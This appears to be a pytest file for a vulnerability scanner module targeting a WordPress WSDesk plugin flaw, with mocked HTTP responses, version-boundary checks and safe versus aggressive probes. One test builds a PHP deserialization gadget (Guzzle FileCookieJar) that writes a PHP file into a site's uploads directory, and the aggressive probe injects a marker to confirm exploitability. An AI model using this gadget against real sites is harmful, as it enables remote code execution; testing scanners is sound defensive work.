from __future__ import annotations

import re
import urllib.parse
from unittest.mock import patch

from proofcms.modules.wordpress import cve_2026_119077 as wsdesk

SUPPORT_PAGE = '{"nonce":"abc123def4"}'


class _FakeClient:
    def __init__(
        self,
        guard: str = '{"status":"success","message":"ok"}',
        fields: str = '{"success":true,"data":{"page":"<input name=\\"proofcmsinj\\">"}}',
        marker_found: bool = True,
    ) -> None:
        self.guard = guard
        self.fields = fields
        self.marker_found = marker_found
        self.marker = ""

    def get(self, url: str, headers=None, timeout: int | None = None) -> dict[str, object]:
        if "readme.txt" in url:
            return {"status": 200, "body": "Stable tag: 3.3.9"}
        if "page_id" in url:
            return {"status": 200, "body": f'<html>wsdesk {SUPPORT_PAGE}</html>'}
        body = self.marker if self.marker_found else ""
        return {"status": 200, "body": body}

    def request(
        self,
        url: str,
        method: str = "GET",
        headers=None,
        data=None,
        timeout: int | None = None,
        follow_redirects: bool = True,
    ) -> dict[str, object]:
        body = (data or b"").decode(errors="replace")
        found = re.search(r"PROOFCMS_119077_[a-f0-9]{12}", urllib.parse.unquote(body))
        if found:
            self.marker = found.group(0)
        if "eh_crm_new_ticket_form" in body:
            return {"status": 200, "body": self.fields}
        if "zzzboguskey" in body:
            return {"status": 200, "body": self.guard}
        return {"status": 200, "body": '{"status":"success","message":"Support Request Received Successfully"}'}


def test_119077_classify_version_boundaries():
    assert wsdesk._classify("3.3.9") == "LIKELY_VULNERABLE"
    assert wsdesk._classify("3.4.0") == "NOT_AFFECTED"
    assert wsdesk._classify("3.4.1") == "NOT_AFFECTED"
    assert wsdesk._classify(None) == "DETECTED_VERSION_UNKNOWN"


def test_119077_gadget_writes_guzzle_filecookiejar():
    payload = wsdesk.file_cookie_jar("/var/www/html/wp-content/uploads/x.php", b"<?php echo 'x'; ?>")
    assert payload.startswith(b'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{')
    assert b"/var/www/html/wp-content/uploads/x.php" in payload
    assert b"PROOFCMS" not in payload
    try:
        wsdesk.file_cookie_jar("/tmp/x", b'<?php echo "x"; ?>')
    except ValueError:
        pass
    else:
        raise AssertionError("double quotes must be rejected")


def test_119077_patched_guard_is_not_affected():
    client = _FakeClient(guard='{"status":"error","message":"Invalid form data."}')
    with patch.object(wsdesk, "HttpClient", return_value=client):
        result = wsdesk.run_aggressive_probe("https://fixture.test")
    assert result.status == "NOT_AFFECTED"
    assert result.evidence["guard"] == "rejected"


def test_119077_marker_readback_confirms():
    with patch.object(wsdesk, "HttpClient", return_value=_FakeClient()):
        result = wsdesk.run_aggressive_probe("https://fixture.test")
    assert result.status == "VULNERABLE"
    assert result.confidence == "CONFIRMED"
    assert result.evidence["marker_found"] is True
    assert result.evidence["inject_slug"] == "proofcmsinj"


def test_119077_no_custom_field_is_not_confirmed():
    client = _FakeClient(fields='{"success":true,"data":{"page":"<div>no fields</div>"}}')
    with patch.object(wsdesk, "HttpClient", return_value=client):
        result = wsdesk.run_aggressive_probe("https://fixture.test")
    assert result.status == "NOT_CONFIRMED"


def test_119077_safe_probe_reads_manifest_without_sending_payload():
    client = _FakeClient()
    with patch.object(wsdesk, "HttpClient", return_value=client):
        result = wsdesk.check("https://fixture.test", run_exploit_check=True, exploit_mode="safe")
    assert result.exploit_ran is True
    assert result.status in {"LIKELY_VULNERABLE", "NOT_AFFECTED"}
